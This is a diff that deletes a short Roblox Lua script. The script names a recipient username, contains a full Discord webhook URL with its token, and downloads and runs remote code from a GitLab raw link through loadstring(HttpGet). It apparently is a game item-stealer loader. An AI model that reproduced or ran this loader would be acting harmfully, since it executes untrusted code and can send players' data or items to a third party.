@@ -1,5 +1,0 @@
-Username = "zybdfarm2"
-Webhook = "https://discord.com/api/webhooks/1403074100947194036/Mw3LELztIDpuca_NX9zaKfVOpzEkhFUxLcQGv6cTyHUJNLROwenynXQj5lWFbrLOwm6b"
-MinimumValue = 1
-
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
